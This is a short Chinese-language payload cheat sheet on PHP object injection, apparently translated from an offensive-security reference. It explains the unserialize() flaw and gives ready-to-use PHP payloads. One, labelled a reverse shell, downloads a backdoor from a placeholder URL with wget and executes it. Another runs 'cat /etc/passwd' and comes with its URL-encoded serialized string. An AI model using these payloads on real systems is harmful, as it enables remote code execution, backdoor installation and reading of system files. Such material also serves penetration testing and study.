# PHP对象注入
PHP对象注入是一种应用程序级别的漏洞，可以让攻击者执行不同类型的恶意攻击, 例如基于背景的代码注入, SQL资料隐码攻击, 路径遍历和程序拒绝服务攻击. 用户提供的输入在传递给未序列化()PHP函数之前，没有经过适当的消毒处理，就会出现漏洞. 由于PHP允许对象序列化, 攻击者可以将特定的序列化字符串传递给脆弱的非序列化()调用, 导致将一个任意的PHP对象(s)注入到应用程序范围.	

## 开发

反向shell
```php
class PHPObjectInjection
{
   // CHANGE URL/FILENAME TO MATCH YOUR SETUP
   public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
}

echo urlencode(serialize(new PHPObjectInjection));
```

基础检测
```php
class PHPObjectInjection
{
   // CHANGE URL/FILENAME TO MATCH YOUR SETUP
   public $inject = "system('cat /etc/passwd');";
}

echo urlencode(serialize(new PHPObjectInjection));
//O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A26%3A%22system%28%27cat+%2Fetc%2Fpasswd%27%29%3B%22%3B%7D
//'O:18:"PHPObjectInjection":1:{s:6:"inject";s:26:"system(\'cat+/etc/passwd\');";}'
```

## 致谢
* https://www.owasp.org/index.php/PHP_Object_Injection


